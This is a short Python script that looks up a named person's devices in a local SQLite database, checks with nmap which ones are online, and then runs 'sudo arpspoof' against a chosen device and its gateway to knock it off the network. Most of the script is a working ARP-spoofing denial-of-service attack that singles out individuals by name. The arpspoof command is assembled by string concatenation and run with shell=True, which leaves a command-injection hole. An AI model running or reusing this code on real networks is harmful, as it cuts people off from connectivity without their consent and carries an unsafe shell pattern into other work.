import sys, sqlite3, subprocess, os

def portScan(IP):
	# Construct the nmap command
	command = ['nmap','-p','500',IP]
	# Run the command
	resultPortCheck = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
	# Have the output split into seperate lines
	output_lines = resultPortCheck.stdout.splitlines()
	# Check if the second line contains the following message...
	if output_lines[1] == "Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn":
            # ...If so then the host is down
            return False
	else:
		# ... if not then the host is up
		return True

def kickoff(deviceTitle, IP):
	print("\nTaking '"+deviceTitle+"' off the network.")
	print("(Ctrl-C to terminate the process, be sure to give it a minute as clean up takes some time)")
	# First find the gateway that the device uses to connect to the internet
	gateway = os.popen("ip route | grep default").read().split()[2]
	# Construct a command using arpspoof and have that output go nowhere so it doesn't spam the terminal
	command = "sudo arpspoof -i eth0 -t "+ IP + " -r " + gateway + "> /dev/null 2>&1"
	subprocess.check_output(command, shell=True)
	
# Retrieve the name of the target from the argument
target = sys.argv[1]
# Connect to the database
conn = sqlite3.connect('LANScanner.db')
c = conn.cursor()
# Select all the devices owned by the target
c.execute("SELECT * from devices where person =?",(target,))
results = c.fetchall()

# If there aren't any results, this mean that the name isn't in the database
if len(results) == 0:
	print("Person isn't identified")
	conn.close()
	exit()
# If there are results then retrieve all the devices that are owned by that person
else:
	availableDevices = {}
	for device in results:
		# For each device conduct a port scan to see if the device is active
		if portScan(device[1]):
			# If the device is active then add the device's name and IP to a dictionary called availableDevices
			availableDevices[device[6]]=device[1]

# Close the connection to the database server
conn.close()

# If there are no elements in the availableDevices dictionary then none of the devices are online. 
if len(availableDevices) == 0:
	print("None of the devices are online.")
	conn.close()
	exit()

# If there is just one element in availableDevices dictionary then...	
elif len(availableDevices) == 1:
	# ...Isolate that one element into a variable
	first_element = next(iter(availableDevices.items()))
	# ...inform the user of what device will be kicked off the network
	print("Taking '"+str(first_element[0])+"' off the network.")
	# ...kick the device off the network.
	kickoff(first_element[0], first_element[1])
	
# However, if there are multiple devices to choose from...
else:
	# Make a list of all the devices that the user can choose from...
	print("Pick a device to kick off the network.")
	for num,elements in enumerate(availableDevices):
		print(str(num+1)+".)",elements)
	# Retrieve the user's selection
	userInput = int(input("#:"))
	# Turn the dictionary of devices into a list so that the user's choice can be selected 
	listofDevices=list(availableDevices.items())
	# Isolate the device the user has chosen...
	chosenElement = listofDevices[userInput-1]
	# Kick the device off the network.
	kickoff(chosenElement[0],chosenElement[1])

